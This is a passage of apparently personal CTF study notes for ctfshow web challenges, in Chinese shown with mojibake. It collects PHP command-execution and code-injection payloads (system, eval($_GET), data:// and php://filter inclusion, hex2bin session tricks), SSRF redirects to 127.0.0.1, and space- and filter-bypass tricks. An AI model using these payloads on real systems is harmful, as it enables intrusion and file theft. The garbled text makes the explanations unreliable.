<h2 id="4-å¯¹127-0-0-1çš„ç»•è¿‡"><a href="#4-å¯¹127-0-0-1çš„ç»•è¿‡" class="headerlink" title="4.å¯¹127.0.0.1çš„ç»•è¿‡:"></a>4.å¯¹127.0.0.1çš„ç»•è¿‡:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å¯ä»¥æŠŠåŸŸåçš„è§£ææ”¹åˆ°<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">    å°±èƒ½æˆåŠŸè§£æ</span><br></pre></td></tr></table></figure>

<h2 id="5-é€šè¿‡302é‡å®šå‘çš„æ–¹æ³•è·³è½¬"><a href="#5-é€šè¿‡302é‡å®šå‘çš„æ–¹æ³•è·³è½¬" class="headerlink" title="5.é€šè¿‡302é‡å®šå‘çš„æ–¹æ³•è·³è½¬:"></a>5.é€šè¿‡302é‡å®šå‘çš„æ–¹æ³•è·³è½¬:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="6-é€šè¿‡æ ‡å‡†çš„urlç»“æ„ç»•è¿‡"><a href="#6-é€šè¿‡æ ‡å‡†çš„urlç»“æ„ç»•è¿‡" class="headerlink" title="6.é€šè¿‡æ ‡å‡†çš„urlç»“æ„ç»•è¿‡:"></a>6.é€šè¿‡æ ‡å‡†çš„urlç»“æ„ç»•è¿‡:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scheme://username:password@host:port/path?query#fragment</span><br></pre></td></tr></table></figure>





<h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°:"></a>å‡½æ•°:</h1><h2 id="1-curl-execå‡½æ•°"><a href="#1-curl-execå‡½æ•°" class="headerlink" title="1.curl_execå‡½æ•°:"></a>1.curl_execå‡½æ•°:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl_exec:æŠŠå‚æ•°å½“ä½œcurlçš„å‚æ•°ä¼ é€’</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œ</title>
    <url>/2025/06/02/ctfshow/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);              --é€šè¿‡*é€šé…ç¬¦æ¥ç»•è¿‡æ£€æµ‹</span><br><span class="line">         ä¹Ÿå¯ä»¥ç”¨cat f???</span><br><span class="line">?c=<span class="keyword">echo</span> `ls`;                     --åœ¨Shell è„šæœ¬æˆ–å‘½ä»¤è¡Œä¸­ï¼Œåå¼•å·` ` å’Œ $() ç”¨äºæ‰§è¡Œå‘½ä»¤å¹¶è·å–å…¶è¾“å‡ºã€‚</span><br><span class="line">            --åå¼•å· æ˜¯â€œshell æ‰§è¡Œæ“ä½œç¬¦â€ â€”â€” ç±»ä¼¼äº<span class="title function_ invoke__">shell_exec</span>()`</span><br><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);        --<span class="keyword">eval</span>() ä¼šæŠŠä¼ å…¥çš„å­—ç¬¦ä¸²å½“æˆPHPä»£ç æ‰§è¡Œã€‚</span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php      --includeæœŸæœ›ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„æ–‡ä»¶åæˆ–è·¯å¾„ã€‚</span></span><br><span class="line">c=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;            --å°†è¾“å…¥çš„ä½œä¸ºä»£ç æ‰§è¡Œ</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-æ€è€ƒï¼š"><a href="#1-æ€è€ƒï¼š" class="headerlink" title="1.æ€è€ƒï¼š"></a>1.æ€è€ƒï¼š</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">é€šè¿‡ls -ld .æ¥æŸ¥çœ‹è¯¥ç›®å½•çš„æƒé™</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch 1.php&#x27;</span>);           --é€šè¿‡touchåˆ›å»ºä¸€ä¸ªæ–‡ä»¶</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo &quot;content&quot; | cat &gt;&gt; 1.php&#x27;</span>);    --é€šè¿‡caté‡å®šå‘å°†è¾“å…¥å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯ä¸èƒ½ç†è§£ä¸ºä»€ä¹ˆå¦‚æœå†™å…¥å†…å®¹æ˜¯ä¸€å¥è¯æœ¨é©¬å°±å†™å…¥ä¸äº†     ---å­—ç¬¦è½¬ä¹‰ ä¸€å¥è¯é©¬é‡Œé¢çš„å­—ç¬¦ä¼šè½¬ä¹‰ æˆ–è€…é—­åˆï¼Œå…ˆç¼–ç åœ¨å†™å…¥ï¼Œå…³é”®æ˜¯å•å¼•å·çš„è½¬ä¹‰</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ls -ld .:</p>
<p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250331210855166.png" alt="image-20250331210855166"></p>
<h3 id="ä¸€äº›ç»•è¿‡"><a href="#ä¸€äº›ç»•è¿‡" class="headerlink" title="ä¸€äº›ç»•è¿‡"></a>ä¸€äº›ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç©ºæ ¼çš„ç»•è¿‡å¯ä»¥ä½¿ç”¨%<span class="number">0</span>aä»£æ›¿     --%<span class="number">0</span>aæ¢è¡Œç¬¦</span><br><span class="line">åˆ†å·å¯ä»¥ç”¨<span class="meta">?&gt;</span>ä»£æ›¿</span><br><span class="line">å°æ•°ç‚¹å¯ä»¥ç”¨<span class="title function_ invoke__">localeconv</span>()     --å‡½æ•°è¿”å›å°æ•°ç‚¹</span><br><span class="line">phpä¸­<span class="keyword">include</span>æ˜¯å¯ä»¥ä¸å¸¦æ‹¬å·çš„å‡½æ•° ----è¿‡æ»¤æ‹¬å·æ—¶ä½¿ç”¨</span><br><span class="line">ç©ºæ ¼(%<span class="number">20</span>)ã€åˆ¶è¡¨ç¬¦(%<span class="number">09</span>)ã€æ¢è¡Œç¬¦(%<span class="number">0</span>a)ã€å›è½¦ç¬¦(%<span class="number">0</span>d)ã€ç©ºå­—èŠ‚ç¬¦(%<span class="number">00</span>)ã€å‚ç›´åˆ¶è¡¨ç¬¦ï¼ˆ%<span class="number">0</span>bï¼‰ï¼Œæ¢é¡µç¬¦ï¼ˆ%<span class="number">0</span>cï¼‰</span><br></pre></td></tr></table></figure>

<h4 id="å¯¹ç©ºæ ¼çš„ç»•è¿‡"><a href="#å¯¹ç©ºæ ¼çš„ç»•è¿‡" class="headerlink" title="å¯¹ç©ºæ ¼çš„ç»•è¿‡"></a>å¯¹ç©ºæ ¼çš„ç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;IFS&#125; ä½†ä¸èƒ½å†™ä½œ <span class="variable">$IFS</span>       --åœ¨ Linux/Bash ä¸­å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼Œ<span class="variable">$IFS</span>é»˜è®¤æ˜¯ç©ºæ ¼ã€Tabã€æ¢è¡Œã€‚ç©ºæ ¼å¯ä»¥è¢« $&#123;IFS&#125; æ›¿ä»£</span><br><span class="line">$IFS$<span class="number">9</span>                 --å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼ˆç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ç©ºæ ¼ï¼‰ ç¬¬ <span class="number">9</span> ä¸ªä½ç½®å‚æ•°ï¼ˆé€šå¸¸ä¸ºç©ºï¼‰</span><br><span class="line">%<span class="number">09</span>                   --URL ç¼–ç çš„ Tab å­—ç¬¦</span><br><span class="line">&lt;&gt;                 </span><br><span class="line">&lt;                      --è¾“å…¥é‡å®šå‘ï¼Œä¾‹å¦‚ cat &lt; flag</span><br><span class="line"><span class="variable">$IFS</span>%<span class="number">09</span></span><br></pre></td></tr></table></figure>



<h3 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h3><p>phpæ”¯æŒçš„ä¼ªåè®®ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// â€” è®¿é—® HTTP(s) ç½‘å€</span></span><br><span class="line">  glob:<span class="comment">//* æ˜¯ä¸€ä¸ª ä¼ªåè®®    ----å¯ä»¥ç”¨æ¥ç»•è¿‡open_basedirç”¨äºé€šè¿‡ fopen()ã€file_get_contents() ç­‰å‡½æ•°è¯»å–åŒ¹é…æ–‡ä»¶çš„å†…å®¹</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// â€” è®¿é—® FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// â€” å‹ç¼©æµ</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰       </span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// â€” PHP å½’æ¡£</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// â€” Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// â€” RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// â€” éŸ³é¢‘æµ</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// â€” å¤„ç†äº¤äº’å¼çš„æµ</span></span><br></pre></td></tr></table></figure>

<h4 id="1-flie"><a href="#1-flie" class="headerlink" title="1.flie:&#x2F;&#x2F;"></a>1.flie:&#x2F;&#x2F;</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php      --convert.base64-encodeï¼Œå°±æ˜¯ä¸€ç§è¿‡æ»¤å™¨</span></span><br><span class="line">php:<span class="comment">//filter/resource=index.php       --æ²¡æœ‰base64ç¼–ç ï¼Œæºç å¯èƒ½æ— æ³•æ˜¾ç¤º(éƒ¨åˆ†å­—ç¬¦è¢«æµè§ˆå™¨è§£æ)</span></span><br></pre></td></tr></table></figure>

<h4 id="2-data"><a href="#2-data" class="headerlink" title="2.data:&#x2F;&#x2F;"></a>2.data:&#x2F;&#x2F;</h4><p>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚å¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;   </span></span><br><span class="line">å¦‚æœè¦ä½¿ç”¨:data:<span class="comment">//å¿…é¡»æ‰“å¼€    --butè¿™ä¸¤ä¸ªæ˜¯é»˜è®¤å…³é—­</span></span><br><span class="line">allow_url_include=On</span><br><span class="line">allow_url_fopen=On</span><br></pre></td></tr></table></figure>

<h4 id="flie-ä¸data-çš„åŒºåˆ«ï¼ˆinclude-â€˜xxxâ€™-include-â€œxxxâ€-ï¼‰"><a href="#flie-ä¸data-çš„åŒºåˆ«ï¼ˆinclude-â€˜xxxâ€™-include-â€œxxxâ€-ï¼‰" class="headerlink" title="flie:&#x2F;&#x2F;ä¸data&#x2F;&#x2F;çš„åŒºåˆ«ï¼ˆinclude â€˜xxxâ€™; include(â€œxxxâ€);ï¼‰"></a>flie:&#x2F;&#x2F;ä¸data&#x2F;&#x2F;çš„åŒºåˆ«ï¼ˆinclude â€˜xxxâ€™; include(â€œxxxâ€);ï¼‰</h4><p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250401164926563.png" alt="image-20250401164926563"></p>
<h2 id="ä½¿ç”¨å‡½æ•°æ‹¿åˆ°flag"><a href="#ä½¿ç”¨å‡½æ•°æ‹¿åˆ°flag" class="headerlink" title="ä½¿ç”¨å‡½æ•°æ‹¿åˆ°flag"></a>ä½¿ç”¨å‡½æ•°æ‹¿åˆ°flag</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">getallheaders</span>()ï¼šè¿”å›æ‰€æœ‰çš„HTTPå¤´ä¿¡æ¯ï¼Œè¿”å›çš„æ˜¯æ•°ç»„è€Œ<span class="keyword">eval</span>è¦æ±‚ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦ç”¨<span class="title function_ invoke__">implode</span>()å‡½æ•°å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>()ï¼šè¯¥å‡½æ•°çš„ä½œç”¨æ˜¯è·å–æ‰€æœ‰çš„å·²å®šä¹‰å˜é‡ï¼Œè¿”å›å€¼ä¹Ÿæ˜¯æ•°ç»„ï¼Œä¸è¿‡æ˜¯äºŒç»´æ•°ç»„ï¼Œç”¨<span class="title function_ invoke__">var_dump</span>()è¾“å‡ºå¯ä»¥çœ‹è§è¾“å‡ºçš„å†…å®¹ï¼Œçœ‹è§åœ¨ç¬¬å‡ ä½ä¹‹åï¼Œå¯ä»¥ç”¨<span class="title function_ invoke__">current</span>()å‡½æ•°æ¥è·å–å…¶å€¼ï¼Œè¯¦ç»†å¯ä»¥çœ‹å®˜æ–¹å‡½æ•°ã€‚</span><br><span class="line">payloadï¼š<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>()));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_id</span>()ï¼š<span class="title function_ invoke__">session_id</span>()å¯ä»¥ç”¨æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œå¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„phpsessionidï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚</span><br><span class="line">    å¦‚å¯ä»¥åœ¨cookieä¸­è®¾ç½® PHPSESSID=<span class="number">706870696e666</span>f28293bï¼Œç„¶åç”¨<span class="title function_ invoke__">hex2bin</span>()å‡½æ•°ï¼Œ</span><br><span class="line">    å³ä¼ å…¥?exp=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));     </span><br><span class="line">    å¹¶è®¾ç½®cookieï¼šPHPSESSID=<span class="number">706870696e666</span>f28293b</span><br><span class="line">    session_start å‡½æ•°æ˜¯ä¸ºäº†å¼€å¯session</span><br><span class="line">    </span><br><span class="line">é…åˆä½¿ç”¨çš„å‡½æ•°ï¼š</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(â€˜.â€™)); æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>()</span><br><span class="line">	<span class="title function_ invoke__">localeconv</span>() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚   --ç¬¬ä¸€ä¸ªå€¼ä¸ºå°æ•°ç‚¹.</span><br><span class="line">	<span class="title function_ invoke__">current</span>() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œposæ˜¯currentçš„åˆ«å</span><br><span class="line">	<span class="title function_ invoke__">each</span>() è¿”å›æ•°ç»„ä¸­å½“å‰çš„é”®/å€¼å¯¹å¹¶å°†æ•°ç»„æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€æ­¥</span><br><span class="line">	<span class="title function_ invoke__">end</span>() å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒ</span><br><span class="line">	<span class="title function_ invoke__">next</span>() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½</span><br><span class="line">	<span class="title function_ invoke__">prev</span>() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå€’å›ä¸€ä½</span><br><span class="line">	<span class="title function_ invoke__">array_reverse</span>() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨å‡½æ•°getallheaders-ï¼š"><a href="#ä½¿ç”¨å‡½æ•°getallheaders-ï¼š" class="headerlink" title="ä½¿ç”¨å‡½æ•°getallheaders()ï¼š"></a>ä½¿ç”¨å‡½æ•°getallheaders()ï¼š</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">getallheaders</span>()));æ„é€ è¿™ä¸ªï¼Œé—®é¢˜æ˜¯å¦‚æœæ²¡æœ‰ <span class="keyword">eval</span>()ï¼Œä¼šè¢«å½“åšå­—ç¬¦ä¸²ï¼Œè€Œä¸ä¼šè¢«æ‰§è¡Œ</span><br><span class="line">Zzzzzz:<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);     ----é…åˆè¿™ä¸ªä½¿ç”¨</span><br></pre></td></tr></table></figure>



<h3 id="å¯¹ä½¿ç”¨-æˆ–è¿ç®—å¾—åˆ°ç­”æ¡ˆ"><a href="#å¯¹ä½¿ç”¨-æˆ–è¿ç®—å¾—åˆ°ç­”æ¡ˆ" class="headerlink" title="å¯¹ä½¿ç”¨| æˆ–è¿ç®—å¾—åˆ°ç­”æ¡ˆ"></a>å¯¹ä½¿ç”¨| æˆ–è¿ç®—å¾—åˆ°ç­”æ¡ˆ</h3><p>åˆ©ç”¨ç©·ä¸¾è„šæœ¬ï¼Œæ¥é€šè¿‡æˆ–è¿ç®—è·å¾—æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦    â€”py</p>
<h2 id="dev-null"><a href="#dev-null" class="headerlink" title="&#x2F;dev&#x2F;null"></a>&#x2F;dev&#x2F;null</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åœ¨ç±»Unixç³»ç»Ÿä¸­,/dev/<span class="literal">null</span>,æˆ–ç§°ç©ºè®¾å¤‡,æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è®¾å¤‡æ–‡ä»¶,å®ƒä¸¢å¼ƒä¸€åˆ‡å†™å…¥å…¶ä¸­çš„æ•°æ®(ä½†æŠ¥å‘Šå†™å…¥æ“ä½œæˆåŠŸ)</span><br><span class="line"><span class="number">0</span>   æ ‡å‡†è¾“å…¥</span><br><span class="line"><span class="number">1</span>   æ ‡å‡†è¾“å‡º</span><br><span class="line"><span class="number">2</span>   é”™è¯¯è¾“å‡º</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>&gt;/dev/<span class="literal">null</span>   æŠŠé”™è¯¯è¾“å‡ºåˆ°ç©ºè®¾å¤‡ï¼ˆå³ä¸¢å¼ƒï¼‰</span><br><span class="line">&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>   ç›¸å½“äº<span class="number">1</span>&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>   å³æŠŠæ ‡å‡†è¾“å‡ºä¸¢å¼ƒï¼Œå¹¶ä¸”æŠŠé”™è¯¯è¾“å‡ºè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚åˆè®¡èµ·æ¥å°±æ˜¯é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºéƒ½è¾“å‡ºåˆ°ç©ºè®¾å¤‡</span><br><span class="line"><span class="number">2</span>&gt;&amp;<span class="number">1</span> &gt;/dev/<span class="literal">null</span>   é”™è¯¯è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼Œå³è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œè€Œæ ‡å‡†è¾“å‡ºè¢«ä¸¢å¼ƒ</span><br><span class="line">something interesting: é‡å®šå‘&gt; å’Œ &gt;&gt;   å‰è€…ä¼šå…ˆæ¸…ç©ºæ–‡ä»¶ï¼Œç„¶åå†å†™å…¥å†…å®¹ï¼Œåè€…ä¼šå°†é‡å®šå‘çš„å†…å®¹è¿½åŠ åˆ°ç°æœ‰æ–‡ä»¶çš„å°¾éƒ¨.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ€è·¯ä¸€ï¼š%<span class="number">0</span>aæˆªæ–­</span><br><span class="line">ä¹Ÿå°±æ˜¯ä½¿ä¸¤æ¡è¯­å¥ä¸åœ¨ä¸€è¡Œä¸Šæ‰§è¡Œ</span><br><span class="line">c=ls%<span class="number">0</span>a</span><br><span class="line">æ€è·¯äºŒï¼šç®¡é“ç¬¦çš„è¿ç”¨</span><br><span class="line">| ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</span><br><span class="line">|| å¦‚æœå‰é¢æ‰§è¡Œçš„è¯­å¥å‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥</span><br><span class="line">&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡</span><br><span class="line">&amp;&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¸æ‰§è¡Œåé¢çš„è¯­å¥</span><br><span class="line">; æ‰§è¡Œå®Œå‰é¢çš„å†æ‰§è¡Œåé¢çš„</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ä½¿ç”¨å‘½ä»¤è·¯å¾„"><a href="#ä½¿ç”¨å‘½ä»¤è·¯å¾„" class="headerlink" title="ä½¿ç”¨å‘½ä»¤è·¯å¾„"></a>ä½¿ç”¨å‘½ä»¤è·¯å¾„</h2> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">binä¸º<span class="keyword">binary</span>çš„ç®€å†™ï¼Œä¸»è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰ã€‚</span><br><span class="line">æˆ‘ä»¬æ—¥å¸¸ç›´æ¥ä½¿ç”¨çš„catæˆ–è€…lsç­‰ç­‰éƒ½å…¶å®æ˜¯ç®€å†™ï¼Œä¾‹å¦‚lså®Œæ•´å…¨ç§°åº”è¯¥æ˜¯/bin/ls</span><br><span class="line">base64å‘½ä»¤ Encode <span class="keyword">and</span> decode using Base64 representation</span><br><span class="line"></span><br><span class="line">c=/???/????<span class="number">64</span> ????.???      ---base64å‘½ä»¤</span><br><span class="line">ä½¿ç”¨which +å‘½ä»¤      ---è¾“å‡ºå…¨éƒ¨çš„å‘½ä»¤è·¯å¾„</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="sourceå‘½ä»¤çš„ä½¿ç”¨"><a href="#sourceå‘½ä»¤çš„ä½¿ç”¨" class="headerlink" title="sourceå‘½ä»¤çš„ä½¿ç”¨"></a>sourceå‘½ä»¤çš„ä½¿ç”¨</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sourceå‘½ä»¤ï¼š</span><br><span class="line">sourceå‘½ä»¤ä¹Ÿç§°ä¸ºâ€œç‚¹å‘½ä»¤â€ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç‚¹ç¬¦å·ï¼ˆ.ï¼‰ã€‚</span><br><span class="line">sourceå‘½ä»¤é€šå¸¸ç”¨äºé‡æ–°æ‰§è¡Œåˆšä¿®æ”¹çš„åˆå§‹åŒ–æ–‡ä»¶ï¼Œä½¿ä¹‹ç«‹å³ç”Ÿæ•ˆï¼Œè€Œä¸å¿…æ³¨é”€å¹¶é‡æ–°ç™»å½•ã€‚</span><br><span class="line">ç”¨æ³•ï¼š </span><br><span class="line">source filename æˆ– . filename</span><br></pre></td></tr></table></figure>

<h2 id="ä»…æœ‰-å’Œ-æ—¶"><a href="#ä»…æœ‰-å’Œ-æ—¶" class="headerlink" title="ä»…æœ‰$å’Œ()æ—¶:"></a>ä»…æœ‰$å’Œ()æ—¶:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(()) ä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º<span class="number">0</span></span><br><span class="line">$((~$(()))) å¯¹<span class="number">0</span>ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-<span class="number">1</span></span><br><span class="line">$(($((~$(())))$((~$(()))))) -<span class="number">1</span>-<span class="number">1</span>ï¼Œä¹Ÿå°±æ˜¯(-<span class="number">1</span>)+(-<span class="number">1</span>)ä¸º-<span class="number">2</span>ï¼Œæ‰€ä»¥å€¼ä¸º-<span class="number">2</span></span><br><span class="line">$((~$(($((~$(())))$((~$(()))))))) å†å¯¹-<span class="number">2</span>åšä¸€æ¬¡å–åå¾—åˆ°<span class="number">1</span>ï¼Œæ‰€ä»¥å€¼ä¸º<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * <span class="number">37</span> + <span class="string">&quot;))&quot;</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h2 id="è¯»å–æ–‡ä»¶å‡½æ•°"><a href="#è¯»å–æ–‡ä»¶å‡½æ•°" class="headerlink" title="è¯»å–æ–‡ä»¶å‡½æ•°"></a>è¯»å–æ–‡ä»¶å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å¸¸ç”¨è¯»æ–‡ä»¶å‡½æ•°</span><br><span class="line">    --å¯¹è¯»å–æ–‡ä»¶æ—¶ï¼Œå¿…é¡»æŒ‡å®šç›®å½•,æ¯”å¦‚å½“å‰ç›®å½•æ˜¯./</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$filename</span>);    --å­—ç¬¦ä¸²<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">php_strip_whitespace</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file â€” 